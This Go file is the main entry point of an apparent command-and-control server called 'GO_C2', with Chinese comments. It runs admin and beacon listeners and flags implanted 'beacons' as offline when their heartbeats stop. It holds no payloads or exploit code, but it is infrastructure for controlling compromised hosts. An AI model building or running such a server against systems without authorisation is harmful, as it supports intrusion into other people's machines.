package main

import (
    "log"
    "net/http"
    "time"
    "fmt"

    "github.com/gin-gonic/gin"
    "GO_C2/config"
    "GO_C2/db"
    "GO_C2/utils"
)

func main() {
    gin.SetMode(gin.ReleaseMode)
    if err := config.Init(); err != nil { log.Fatalf("Failed to init config: %v", err) }
    if err := db.Init(); err != nil { log.Fatalf("Failed to init database: %v", err) }

    // 路由拆分：管理端/Beacon 端
    adminRouter := setupRouter() // 管理与 API
    beaconRouter := setupBeaconOnlyRouter() // 仅暴露 register 与 beacon endpoint

    // 避免重复绑定：记录已启动的地址
    started := map[string]bool{}

    // 启动主监听（作为管理端）
    mainAddr := config.GetServerAddress()
    go startHTTP(adminRouter, mainAddr)
    started[mainAddr] = true

    // 启动额外监听（多条，根据 Type 控制路由）
    for _, l := range config.GlobalConfig.Server.Listeners {
        host := l.Host
        if host == "" { host = config.GlobalConfig.Server.Host }
        port := l.Port
        if port == 0 { port = config.GlobalConfig.Server.Port }
        addr := fmt.Sprintf("%s:%d", host, port)
        if started[addr] { continue }
        switch l.Type {
        case "beacon":
            go startHTTP(beaconRouter, addr)
        case "both":
            go startHTTP(adminRouter, addr)
        default: // admin 或空
            go startHTTP(adminRouter, addr)
        }
        started[addr] = true
    }
    // HTTPS（主端口）
    if config.IsHTTPSEnabled() { go startHTTPS(adminRouter, config.GetHTTPSServerAddress(), config.GlobalConfig.Server.CertFile, config.GlobalConfig.Server.KeyFile) }
    // 启动掉线检测协程（N=3）
    go startOfflineDetector()
    select {}
}

func startHTTP(h http.Handler, addr string) {
    srv := &http.Server{ Addr: addr, Handler: h, ReadTimeout: time.Duration(config.GlobalConfig.Server.ReadTimeout) * time.Second, WriteTimeout: time.Duration(config.GlobalConfig.Server.WriteTimeout) * time.Second, MaxHeaderBytes: 1 << 20 }
    log.Printf("HTTP listening on %s", addr)
    if err := srv.ListenAndServe(); err != nil { log.Printf("HTTP server error (%s): %v", addr, err) }
}

func startHTTPS(h http.Handler, addr, cert, key string) {
    srv := &http.Server{ Addr: addr, Handler: h, ReadTimeout: time.Duration(config.GlobalConfig.Server.ReadTimeout) * time.Second, WriteTimeout: time.Duration(config.GlobalConfig.Server.WriteTimeout) * time.Second, MaxHeaderBytes: 1 << 20 }
    log.Printf("HTTPS listening on %s", addr)
    if err := srv.ListenAndServeTLS(cert, key); err != nil { log.Printf("HTTPS server error (%s): %v", addr, err) }
}

// 掉线检测：sleep<60s 时跳过离线判断；sleep>=60s 时若 last_seen 超过 N*sleep_seconds（N=5）未心跳，则判定离线；恢复需稳定 2*sleep_seconds
func startOfflineDetector() {
    ticker := time.NewTicker(30 * time.Second)
    defer ticker.Stop()
    offlineNotified := map[string]time.Time{}
    for range ticker.C {
        beacons, err := db.ListBeacons()
        if err != nil { continue }
        now := time.Now()
        for _, b := range beacons {
            hb := b.SleepSeconds
            if hb <= 0 { hb = 10 }
            // sleep<60s：跳过离线/上线判断
            if hb < 60 { continue }
            offlineThreshold := time.Duration(hb*5) * time.Second
            recoveryThreshold := time.Duration(hb*2) * time.Second
            if now.Sub(b.LastSeen) > offlineThreshold {
                // 已离线
                if t, ok := offlineNotified[b.UUID]; ok {
                    // 超过 1 小时可重复提示
                    if now.Sub(t) < time.Hour { continue }
                }
                go utils.SendJobCompletedMarkdownNotification(b, "Offline", "timeout", fmt.Sprintf("No heartbeat > %ds", hb*5))
                offlineNotified[b.UUID] = now
            } else {
                // 恢复上线：仅当已离线且持续恢复 >= 2*hb 才通知，避免抖动
                if _, ok := offlineNotified[b.UUID]; ok {
                    if now.Sub(b.LastSeen) <= recoveryThreshold {
                        delete(offlineNotified, b.UUID)
                        go utils.SendBeaconRegistrationMarkdownNotification(b)
                    }
                }
            }
        }
    }
}


